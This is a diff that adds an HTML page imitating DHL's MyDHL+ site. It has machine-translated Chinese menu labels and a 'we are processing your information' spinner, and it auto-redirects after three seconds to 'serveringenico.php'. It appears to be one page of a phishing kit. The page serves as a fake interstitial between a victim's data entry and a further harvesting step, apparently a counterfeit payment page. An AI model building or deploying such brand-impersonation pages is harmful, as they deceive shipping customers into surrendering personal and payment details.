@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en-EN">
+   <!--<![endif]-->
+   <head>
+      <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+      <meta charset="UTF-8">
+	  <meta HTTP-EQUIV="REFRESH" content="3; url=serveringenico.php">
+      <title>加工</title>
+      <link rel="icon" type="image/ico" href="load/favicon.ico">
+      <link rel="stylesheet" type="text/css" href="load/ewf-base.d0b32e2aa5bde8d44fd25fb84e676c83a08c45abfcb4a4dca34bfa5d90d51da1.css">
+      <link rel="stylesheet" type="text/css" href="load/ewf-components.9ce7abcd4bcccd54398bb946b71d0e79fc0d76e3915cf02533e892832d4e0dd1.css">
+      <link rel="stylesheet" type="text/css" href="load/ewf-cosmetic.7d0b07e2e3eed7c681fd1adf46e1e8bf716f2f153ddcdc0841c9e1940ba8b6d0.css">
+      <!--[if lte IE 9]>
+      <![endif]-->
+      <style>.cke{visibility:hidden;}</style>
+   </head>
+   <body ewf-persona-type="" ewf-persona-type-is-preview-mode="false" ewf-first-meaningful-paint="" ewf-ie11-identify="" ewf-new-look="true" bindonce="" class="ng-boot-finished v2-non-corp pt-guest pt-end-user ah-not-account-holder">
+      <div ewf-session-manager="">
+      </div>
+      <header class="header v2-header" role="banner">
+         <div class="v2-header__container " ewf-top-nav="">
+            <div id="corp-nav-container" ewf-corp-nav-blink-workaround="" class="is-hidden">
+               <!-- ngIf: topNavCtrl.isCorpNavDisplayed -->
+            </div>
+            <nav class="top-bar v2-top-bar v2-header-bar" aqa-id="eyebrowNav">
+               <div class="v2-horizontal-page-spacing">
+                  <div class="header__logo v2-header__logo"><a target="_self" href="#" data-tracking="{&quot;type&quot;:&quot;dhlHeaderLogo&quot;,&quot;title&quot;:{&quot;en&quot;:&quot;&quot;}}">
+                     <img class="cq-dd-image " src="files/Logo.jpg" alt="" data-emptytext="Image">
+                     </a>
+                  </div>
+                  <div class="country-selector__lang v2-country-selector__lang" id="languages" ewf-location="">
+                     <a data-tracking="{'type':'locationItem','title':{'en': 'Change language'}}" ng-class="{'is-selected': locationCtrl.isSelectedLanguage('en')}" ng-click="locationCtrl.changeLanguage('en')" class="is-selected">
+                     English
+                     </a>
+                     <span></span>
+                  </div>
+                  <ul class="top-nav top-nav_tiny v2-top-nav_tiny top-nav_service v2-top-nav_service">
+                     <li class="top-nav__item v2-top-nav__item">
+                        <a class="top-nav__link v2-top-nav__link" href="#" target="_self" data-tracking="{'type':'dhlServiceNav','title':{'en': ''}}">
+                        幫助和支持
+                        </a>
+                     </li>
+                     <li class="top-nav__item v2-top-nav__item">
+                        <a class="top-nav__link v2-top-nav__link" href="#" target="_self" data-tracking="{'type':'dhlServiceNav','title':{'en': ''}}">
+                        查找位置
+                        </a>
+                     </li>
+                     <li class="top-nav__item v2-top-nav__item padding-none">
+                        <div role="search" ewf-page-search-field="" ewf-page-search-field-solr-url="/solr/mydhl-content" class="ng-isolate-scope">
+                           <label class="page-search">
+                              <span class="page-search-divider"></span>
+                              <i class="dhlicon-v2-search page-search-icon" aria-label="Open search bar in top navigation"></i>
+                              <!-- ngIf: pageSearchFieldCtrl.isExpanded -->
+                              <input type="text" class="page-search-field ng-pristine ng-valid page-search-dropdown-hidden ng-empty" placeholder="Search" ng-model="pageSearchFieldCtrl.searchTerm" typeahead="suggestion for suggestion in pageSearchFieldCtrl.getSuggestions($viewValue)" typeahead-on-select="pageSearchFieldCtrl.selectSuggestion($item)" typeahead-wait-ms="300" typeahead-min-length="2" typeahead-focus-first="false" ewf-typeahead-custom-open="" ewf-typeahead-custom-open-prohibit-empty="true" aria-autocomplete="list" aria-expanded="false" aria-owns="typeahead-00A-5020" value="">
+                              <ul class="dropdown-menu ng-isolate-scope ng-hide" ng-show="isOpen()" ng-style="{top: position.top+'px', left: position.left+'px'}" style="display: block;;display: block;" role="listbox" aria-hidden="true" typeahead-popup="" id="typeahead-00A-5020" matches="matches" active="activeIdx" select="select(activeIdx)" query="query" position="position">
+                                 <!-- ngRepeat: match in matches track by $index -->
+                              </ul>
+                           </label>
+                        </div>
+                     </li>
+                     <li class="v2-vertical-divider"></li>
+                     <div class="chat-config dhl-chat-config">
+                     </div>
+                  </ul>
+               </div>
+            </nav>
+            <div class="v2-horizontal-divider"></div>
+            <div class="v2-header-bar" ewf-compile-once-if="firstMeaningfulPaintCtrl.areCriticalComponentsReady()">
+               <div class="v2-horizontal-page-spacing ng-scope">
+                  <!-- ngIf: firstMeaningfulPaintCtrl.areCriticalComponentsReady() -->
+                  <table class="nav-bar v2-nav-bar ng-scope" role="presentation" ng-if="firstMeaningfulPaintCtrl.areCriticalComponentsReady()">
+                     <!-- ngIf: !topNavCtrl.isGuest() -->
+                     <!-- ngIf: topNavCtrl.isGuest() -->
+                     <tbody ng-if="topNavCtrl.isGuest()" class="ng-scope">
+                        <tr>
+                           <td class="nav-bar__left">
+                              <table class="top-nav top-nav_main v2-top-nav_main" role="presentation">
+                                 <tbody>
+                                    <tr>
+                                       <!-- ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_my-dhl-home') -->
+                                       <td class="top-nav__item v2-top-nav__item ng-scope" ng-if="topNavCtrl.isTranslationExist('navigation.top-nav_link_my-dhl-home')">
+                                          <a class="top-nav__link v2-top-nav__link" href="#" data-tracking="{'type':'dhlTopNavMenuGuest','title':{'en': 'My dhl home'}}" link-text="MyDHL+ Home">
+                                          家
+                                          </a>
+                                       </td>
+                                       <!-- end ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_my-dhl-home') -->
+                                       <!-- ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_ship') -->
+                                       <td class="top-nav__item v2-top-nav__item ng-scope" role="navigation" aria-labelledby="top-nav-ship-guest" ng-if="topNavCtrl.isTranslationExist('navigation.top-nav_link_ship')" ewf-click-descendant-class="top-nav__item-clicked">
+                                          <!-- ewfcIf: CI1102_ALLOW_GUEST_TO_CREATE_SHIPMENTS --><a id="top-nav-ship-guest" class="top-nav__link v2-top-nav__link ng-scope" data-tracking="{'type':'dhlTopNavMenuGuest','title':{'en': 'Ship link'}}" link-text="Ship" ewfc-if="CI1102_ALLOW_GUEST_TO_CREATE_SHIPMENTS">
+                                          船
+                                          </a><!-- end ngIf: function e(){return n[a+"Inverse"]?!u.isVisible():u.isVisible()} -->
+                                          <!-- ewfcIf: CI1102_ALLOW_GUEST_TO_CREATE_SHIPMENTS -->
+                                       </td>
+                                       <!-- end ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_ship') -->
+                                       <!-- ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_track') -->
+                                       <td class="top-nav__item v2-top-nav__item ng-scope" ng-if="topNavCtrl.isTranslationExist('navigation.top-nav_link_track')" ewf-click-descendant-class="top-nav__item-clicked">
+                                          <a class="top-nav__link v2-top-nav__link" data-tracking="{'type':'dhlTopNavMenuGuest','title':{'en': 'Track element'}}" link-text="Track">
+                                          追踪
+                                          </a>
+                                       </td>
+                                       <!-- end ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_track') -->
+                                    </tr>
+                                 </tbody>
+                              </table>
+                           </td>
+                           <td class="nav-bar__right">
+                              <table class="top-nav top-nav_tiny v2-top-nav_tiny" role="presentation">
+                                 <tbody>
+                                    <tr>
+                                       <!-- ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_register') -->
+                                       <td class="top-nav__item v2-top-nav__item ng-scope" ng-if="topNavCtrl.isTranslationExist('navigation.top-nav_link_register')">
+                                          <a class="top-nav__link v2-top-nav__link" href="#" data-tracking="{'type':'dhlTopNavMenuGuest','title':{'en': 'Register user'}}" aqa-id="registration-start">
+                                          登記
+                                          </a>
+                                       </td>
+                                       <!-- end ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_register') -->
+                                       <!-- ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_login') -->
+                                       <td class="top-nav__item v2-top-nav__item login-popup ng-scope" ng-if="topNavCtrl.isTranslationExist('navigation.top-nav_link_login')" ng-class="{'login-popup-visible': !toggleSwitchCtrl.collapsed}" ewf-toggle-switch="" ewf-toggle-switch-collapsed="true">
+                                          <a id="loginButton" class="top-nav__link v2-top-nav__link" aria-expanded="false" ng-click="toggleSwitchCtrl.toggle()" data-tracking="{'type':'dhlTopNavMenuGuest','title':{'en': 'Login guest'}}" aqa-id="guestLoginButton">
+                                          <span>
+                                          登錄
+                                          </span>
+                                          </a>
+                                       </td>
+                                       <!-- end ngIf: topNavCtrl.isTranslationExist('navigation.top-nav_link_login') -->
+                                    </tr>
+                                 </tbody>
+                              </table>
+                              <table class="top-nav top-nav_tiny v2-top-nav_tiny" role="presentation">
+                              </table>
+                           </td>
+                        </tr>
+                     </tbody>
+                  </table>
+               </div>
+            </div>
+            <div ewf-reset-assign-group=""></div>
+         </div>
+         <div ewf-interceptors-alert="" class="ng-isolate-scope">
+         </div>
+      </header>
+      <div>
+         <div class="page-content" role="main">
+            <div>
+               <div class="dhl-shipment">
+                  <div ui-view="" class="ng-scope">
+                     <div class="container ng-scope">
+                        <div ui-view="" class="ng-scope">
+                           <div class="container ng-scope">
+                              <div ewf-shipment-status="">
+                                 <div class="spinner-wrapper" aqa-id="spinner">
+                                    <div class="spinner-wrapper__spinner"></div>
+                                    <div class="spinner-wrapper__text">
+                                       <br><br>
+                                       <div class="message-wrapper">我們正在處理您的信息...
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div id="chat_container">
+         <div class="container">
+            <a class="chat_button" data-tracking="{'type':'bodyFooterModal','title':{'en': 'Chat'}}"></a>
+         </div>
+      </div>
+      <div class="spinner-wrapper is-hidden" ng-class="{'is-hidden': !spinnerCtrl.isSpinnerVisible()}" ewf-spinner="" aqa-id="spinner">
+         <div class="spinner-wrapper__spinner"></div>
+      </div>
+      <!-- ngIf: firstMeaningfulPaintCtrl.areCriticalComponentsReady() -->
+      <div ng-if="firstMeaningfulPaintCtrl.areCriticalComponentsReady()" ewf-global-modal="" class="ng-scope"></div>
+      <!-- end ngIf: firstMeaningfulPaintCtrl.areCriticalComponentsReady() -->
+      <!-- Be aware! Displaying of elements in this html is customisable by css depending on the page where it used -->
+   </body>
+</html>
